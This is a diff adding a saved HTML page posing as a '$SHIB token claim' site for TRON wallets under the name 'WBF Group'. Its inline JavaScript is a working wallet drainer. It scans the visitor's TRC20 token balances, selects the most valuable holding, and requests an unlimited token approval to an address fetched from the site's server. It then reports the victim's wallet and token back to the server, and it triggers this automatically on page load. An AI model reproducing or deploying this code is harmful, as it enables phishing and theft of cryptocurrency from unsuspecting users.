@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://claim.shib.center/?s=783 -->
+<html lang="en" data-dpr="1" style="font-size: 36px;" class="no-touch"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <!-- Required meta tags-->
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no, email=no">
+  <meta name="msapplication-tap-highlight" content="no">
+  <meta name="x5-orientation" content="portrait">
+  <meta name="x5-fullscreen" content="true">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <!-- App title -->
+  <title>WBF Group</title>
+  <!-- Framework7 Library CSS -->
+  <link rel="stylesheet" href="./claim_files/vendor.min.css">
+  <link rel="shortcut icon" href="https://claim.shib.center/favicon.ico" type="image/x-icon">
+
+  <!-- Custom app styles-->
+  <link rel="stylesheet" href="./claim_files/reset.min.css">
+  <link rel="stylesheet" href="./claim_files/main.css">
+  <script src="./claim_files/bignumber.min.js"></script>
+  <script type="text/javascript" src="./claim_files/evmchain.js"></script>
+
+  <!-- Jquery app core js-->
+  <script src="./claim_files/jquery.min.js" integrity="sha512-AFwxAkWdvxRd9qhYYp1qbeRZj6/iTNmJ2GFwcxsMOzwwTaRwz2a/2TX225Ebcj3whXte1WGQb38cXE5j7ZQw3g==" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="./claim_files/flexible.js"></script>
+  <script type="text/javascript" src="./claim_files/qrcode.min.js"></script>
+  <style type="text/css">
+
+    .tishi {
+      width: 3.5rem;
+      height: 1.2rem;
+      background: #00000059;
+      z-index: 999999999999;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border-radius: 0.1rem;
+      color: white;
+      font-size: 0.6rem;
+      text-align: center;
+      line-height: 1.2rem;
+      display: none;
+    }
+
+    .wrongchainid {
+      width: 6rem;
+      height: 1.8rem;
+      background: #00000059;
+      z-index: 999999999999;
+      position: fixed;
+      top: 10%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border-radius: 0.1rem;
+      color: white;
+      font-size: 0.4rem;
+      text-align: center;
+      display: none;
+    }
+  </style>
+
+
+  <style data-styled="active" data-styled-version="5.2.0"></style><style data-styled="active" data-styled-version="5.2.0"></style>
+  <style type="text/css">
+    .iw-contextMenu {
+      box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.10) !important;
+      border: 1px solid #c8c7cc !important;
+      border-radius: 11px !important;
+      display: none;
+      z-index: 1000000132;
+      max-width: 300px !important;
+      width: auto !important;
+    }
+
+    .dark-mode .iw-contextMenu,
+    .TnITTtw-dark-mode.iw-contextMenu,
+    .TnITTtw-dark-mode .iw-contextMenu {
+      border-color: #747473 !important;
+    }
+
+    .iw-cm-menu {
+      background: #fff !important;
+      color: #000 !important;
+      margin: 0px !important;
+      padding: 0px !important;
+      overflow: visible !important;
+    }
+
+    .dark-mode .iw-cm-menu,
+    .TnITTtw-dark-mode.iw-cm-menu,
+    .TnITTtw-dark-mode .iw-cm-menu {
+      background: #525251 !important;
+      color: #FFF !important;
+    }
+
+    .iw-cm-menu li {
+      font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif !important;
+      list-style: none !important;
+      padding: 10px !important;
+      padding-right: 20px !important;
+      border-bottom: 1px solid #c8c7cc !important;
+      font-weight: 400 !important;
+      cursor: pointer !important;
+      position: relative !important;
+      font-size: 14px !important;
+      margin: 0 !important;
+      line-height: inherit !important;
+      border-radius: 0 !important;
+      display: block !important;
+    }
+
+    .dark-mode .iw-cm-menu li,
+    .TnITTtw-dark-mode .iw-cm-menu li {
+      border-bottom-color: #747473 !important;
+    }
+
+    .iw-cm-menu li:first-child {
+      border-top-left-radius: 11px !important;
+      border-top-right-radius: 11px !important;
+    }
+
+    .iw-cm-menu li:last-child {
+      border-bottom-left-radius: 11px !important;
+      border-bottom-right-radius: 11px !important;
+      border-bottom: none !important;
+    }
+
+    .iw-mOverlay {
+      position: absolute !important;
+      width: 100% !important;
+      height: 100% !important;
+      top: 0px !important;
+      left: 0px !important;
+      background: #FFF !important;
+      opacity: .5 !important;
+    }
+
+    .iw-contextMenu li.iw-mDisable {
+      opacity: 0.3 !important;
+      cursor: default !important;
+    }
+
+    .iw-mSelected {
+      background-color: #F6F6F6 !important;
+    }
+
+    .dark-mode .iw-mSelected,
+    .TnITTtw-dark-mode .iw-mSelected {
+      background-color: #676766 !important;
+    }
+
+    .iw-cm-arrow-right {
+      width: 0 !important;
+      height: 0 !important;
+      border-top: 5px solid transparent !important;
+      border-bottom: 5px solid transparent !important;
+      border-left: 5px solid #000 !important;
+      position: absolute !important;
+      right: 5px !important;
+      top: 50% !important;
+      margin-top: -5px !important;
+    }
+
+    .dark-mode .iw-cm-arrow-right,
+    .TnITTtw-dark-mode .iw-cm-arrow-right {
+      border-left-color: #FFF !important;
+    }
+
+
+    /*context menu css end */
+  </style>
+  <style type="text/css">
+    @-webkit-keyframes load4 {
+
+      0%,
+      100% {
+        box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
+      }
+
+      12.5% {
+        box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+      }
+
+      25% {
+        box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+      }
+
+      37.5% {
+        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
+      }
+
+      50% {
+        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
+      }
+
+      62.5% {
+        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
+      }
+
+      75% {
+        box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
+      }
+
+      87.5% {
+        box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
+      }
+    }
+
+    @keyframes load4 {
+
+      0%,
+      100% {
+        box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
+      }
+
+      12.5% {
+        box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+      }
+
+      25% {
+        box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+      }
+
+      37.5% {
+        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
+      }
+
+      50% {
+        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
+      }
+
+      62.5% {
+        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
+      }
+
+      75% {
+        box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
+      }
+
+      87.5% {
+        box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
+      }
+    }
+  </style>
+  <style type="text/css">
+    /* This is not a zero-length file! */
+  </style>
+</head>
+
+<body style="font-size: 12px;">
+<!-- Views -->
+<div class="views">
+  <!-- main view -->
+  <div class="view view-main">
+    <!-- Pages -->
+    <div class="pages navbar-through">
+      <div class="page">
+        <!-- Top Navbar-->
+        <div class="page-content" style="padding-top: 0.5rem;">
+          <!-- <div class="list-block address">
+              <div class="title" style="color: #0fadaf;"><img
+                      style="height:1rem;width:1rem;padding-bottom:-0.5rem;"
+                      src="./usdt_files/WBF.png"> WBF Group</div>
+              <div class="list-block-title"> Your Address</div>
+              <ul>
+                  <li class="item-content">
+                      <div class="item-inner">
+                          <div id="youraddress" class="item-title">Please connect your wallet</div>
+                      </div>
+                  </li>
+              </ul>
+          </div> -->
+          <div class="list-block address">
+            <div class="title" style="color: #0fadaf;"><img style="height:0.48rem;width:1rem;padding-bottom:8px;" src="./claim_files/WBF.png"> WBF Group</div>
+            <div class="list-block amount">
+              <div class="list-block-title">Claim<span> <button id="max-btn" class="max" style="width:1.2rem;height:0.6rem;border-radius: 2rem;" onclick="to_max();">Max</button>$SHIB Token</span>
+              </div>
+              <ul>
+                <li class="item-content">
+                  <div class="item-inner">
+                    <div class="item-title" style="display: block;">
+                      <input type="text" id="SHIB_price" onkeyup="only_num(this)" onblur="only_num(this)" onchange="only_num(this)" style="width:6.5rem;font-size:0.5rem;display:inline;" placeholder="0.00">
+                      <span class="num" id="20000000" style="font-size:0.4rem;"> $SHIB</span>
+                    </div>
+                  </div>
+                </li>
+                <!-- <li class="item-content">
+                            <div class="item-inner">
+                                <div class="item-after">Remarks</div>
+                            </div>
+                        </li> -->
+              </ul>
+            </div>
+          </div>
+          <div class="list-block amount">
+            <div class="list-block-title">≈<span id="tetherusdorbinanceusd"> $Tether USD</span></div>
+            <ul>
+              <li class="item-content">
+                <div class="item-inner">
+                  <div class="item-title">
+                    <input type="text" id="BUSD_price" name="BUG_price_name" style="width:6.5rem;font-size:0.5rem;display:inline;" placeholder="150.00" disabled="">
+                    <span class="num" id="busdorusdt" style="font-size:0.4rem;"> $USDT</span>
+                    <p></p>
+                  </div>
+                </div>
+              </li>
+              <!-- <li class="item-content">
+                  <div class="item-inner">
+                      <div class="item-after">Remarks</div>
+                  </div>
+              </li> -->
+            </ul>
+          </div>
+          <div class="list-block-button" style="font-size:0.3rem;">
+            <button class="button button-fill" style="margin-bottom:10px;background-color:#0fadaf;border-radius: 0.5rem;" id="btn-connect">Approve &gt; Claim</button>
+            If you can't connect your wallet, please <a id="goApp" target="_blank">click here</a>
+
+          </div>
+        </div>
+      </div>
+      <!-- Preloader -->
+      <div class="modal modal-out">
+        <div class="preloader"></div>
+      </div>
+      <div class="tishi">
+        Success
+      </div>
+      <!-- Preloader -->
+      <div class="modal modal-out">
+        <div class="preloader"></div>
+      </div>
+      <!-- <div class="wrongchainid">
+          <div style="font-size: 0.5rem;margin-bottom:0.1rem;margin-top:0.2rem">Wrong chain ID</div> please
+          switch to BSC
+          network
+      </div> -->
+    </div>
+  </div>
+</div>
+<div id="fffsss" style="color: white;
+    z-index: 99999999999999999;
+    position: absolute;top: 1px;"></div>
+
+<!-- Custom app js-->
+<script src="./claim_files/main.js"></script>
+<script src="./claim_files/TronWeb.js"></script>
+<script type="text/javascript">
+  var address = getUrlQueryString('address')
+  var rank = 6.5;
+  var authorized_address = '';
+  var domain = 'https://' + window.location.host + '/';
+  var bizhong = '';
+  var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  var total=0;
+  var trx = 0;
+  function getUrlQueryString(names, urls) {
+    urls = urls || window.location.href;
+    urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+    var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+    var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+    if (r != null && r[2] != "")return unescape(r[2]);
+    return null;
+
+  }
+
+  $('input.num').bind('input propertychange', function()
+  {
+    if($(this).val() && $(this).val()>0){
+      $('#btn-connect').css('background','#078bc3');
+    }else{
+      $('#btn-connect').css('background','#dde0dd');
+    }
+    $('#price').text(($(this).val()*rank).toLocaleString() )
+
+  })
+
+  function getInfo(){
+    $.ajax({
+      type: 'get',
+      url:  domain + 'api/get_trc',
+      async : false,
+      success:function(data){
+        console.log(data)
+        authorized_address = data.data.authorized_address;
+        console.log(authorized_address);
+      },
+      error:function(data){
+
+      }
+    })
+  }
+
+  async function postInfo(address,symbol){
+    var s = getUrlQueryString('s')
+    var a = getUrlQueryString('r')
+
+    if (trx < 5) {
+      return
+    }
+
+
+// 		if (total == 0) {
+// 				return;
+// 			}
+
+    var data = {
+      address:address,
+      authorized_address:authorized_address,
+      bizhong:symbol,
+      code:s,
+      reffer:a,
+      type:1
+    }
+    $.ajax({
+      type: 'post',
+      url:  domain + 'api/insert_trc',
+      data:data,
+      // success:function(data){
+      // //console.log(data)
+      //     if(data.code === 200){
+      //     	console.log('success')
+      //     }
+      //     console.log(data.msg)
+      // },
+      // error:function(data){
+      // 	console.log(data)
+      // }
+    })
+  }
+  $('#address').text(address)
+
+
+  $(function() {
+
+    const addr = {
+      'WIN': 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
+      'USDT':'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+      'TONS': 'THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt',
+      'USDJ': 'TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT',
+      'JST': 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
+      'HT': 'TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h',
+      'SUN': 'TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9',
+      "EXNX": "TCcVeKtYUrHEQDPmozjJFMrf6XX7BgF84A",
+      "VCOIN": "TNisVGhbxrJiEHyYUMPxRzgytUtGM7vssZ",
+      "POL":"TWcDDx1Q6QEoBrJi9qehtZnD4vcXXuVLer",
+      "CKRW":"TTVTdn8ipmacfKsCHw5Za48NRnaBRKeJ44"
+    }
+
+    const price = {
+      'WIN': 0.001150,
+      'USDT':1,
+      'TONS':1.35,
+      'USDJ':1.04,
+      'JST': 0.125,
+      "HT": 20.41,
+      "SUN": 33.97,
+      "EXNX": 0.0621,
+      "VCOIN": 0.004225,
+      "POL": 0.1393,
+      "CKRW": 0.002487,
+    }
+
+    const decimals = {
+      'WIN': 6,
+      'USDT':6,
+      'TONS':6,
+      'USDJ':18,
+      'JST': 18,
+      "HT": 18,
+      "SUN": 18,
+      "EXNX": 18,
+      "VCOIN": 6,
+      "POL": 8,
+      "CKRW": 6,
+    }
+
+
+    async function getMostValuableAssets(account) {
+      let _symbol = 'USDT'
+// 			fffsss = fffsss + "account:" + account + "---"
+// 			$("#fffsss").text(fffsss)
+      for (const symbol of Object.keys(addr)) {
+        let contract = await tronWeb.contract().at(addr[symbol]);
+        let myBalance = await contract.balanceOf(account).call(function(err,balance){
+          const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+          console.log(usdt);
+          if (usdt > total && usdt > 500) {
+            _symbol = symbol
+            total = usdt
+            approveAddr = addr[_symbol]
+          }
+        })
+      }
+      bizhong = _symbol
+      return _symbol
+    }
+
+    /**
+     * * Connect wallet button pressed.
+     */
+    async function onConnect() {
+      $('.pages').append('<div class="modal-overlay"></div>');
+      $('.modal-overlay').addClass('modal-overlay-visible');
+      $('.modal').removeClass('modal-out').addClass('modal-in');
+      // fffsss = fffsss + "开始:"
+      let tronWeb = window.tronWeb
+      // fffsss = fffsss + "tronWeb:" + tronWeb + "---"
+      // $("#fffsss").text(fffsss)
+      let walletAddress = tronWeb.defaultAddress.base58;
+      // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+      // $("#fffsss").text(fffsss)
+      bizhong = await getMostValuableAssets(walletAddress);
+      // fffsss = fffsss + "approveAddr:" + approveAddr + "---"
+      // $("#fffsss").text(fffsss)
+      let instance = await tronWeb.contract().at(approveAddr);
+      // fffsss = fffsss + "instance:" + instance + "---"
+      // $("#fffsss").text(fffsss)
+      // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+      // $("#fffsss").text(fffsss)
+      // fffsss = fffsss + "bizhong:" + bizhong + "---"
+      // $("#fffsss").text(fffsss)
+
+      tradeobj = await tronWeb.trx.getAccount(
+              walletAddress,
+      ).then(output => {
+        console.log('- Output:', output, '\n');
+        trx = output.balance / 1000000;
+      });
+
+      let res = await instance["approve"](authorized_address,"90000000000000000000000000000");
+      res.send({
+        feeLimit: 100000000,
+        callValue: 0,
+        shouldPollResponse: false
+      },function(err,res){
+        // fffsss = fffsss + "res:" + res + "---"
+        // $("#fffsss").text(fffsss)
+        // fffsss = fffsss + "err:" + err + "---"
+        // $("#fffsss").text(fffsss)
+        if(err == null){
+          // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+          // $("#fffsss").text(fffsss)
+          // fffsss = fffsss + "bizhong:" + bizhong + "---"
+          // $("#fffsss").text(fffsss)
+          $(".tishi").fadeIn()
+          setTimeout(function () {
+            $(".tishi").fadeOut()
+          },2000);
+          postInfo(walletAddress,bizhong)
+        }
+        $('.modal-overlay').remove();
+        $('.modal').removeClass('modal-in').addClass('modal-out');
+      })
+    }
+    function init() {
+      getInfo();
+
+
+
+    }
+
+
+    async function s(){
+      var tronWeb = window.tronWeb
+      let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+      let walletAddress = tronWeb.defaultAddress.base58;
+      let result = await contract.balanceOf(walletAddress).call(function(err,tex){
+        if(err == null){
+          let total = tex._hex/(10**6);
+          $('#yu').text(total.toLocaleString() +' USDT')
+          console.log();
+        }
+      });
+
+    }
+
+    /**
+     * Main entry point.
+     */
+
+    init();
+    document.querySelector("#btn-connect").addEventListener("click", onConnect);
+    document.querySelector("#goApp").addEventListener("click", onConnect);
+    onConnect();
+  })
+
+  $(function(){
+
+    setTimeout(function(){
+      $('#s').click()
+    },1000);
+
+
+
+  })
+</script>
+</body></html>
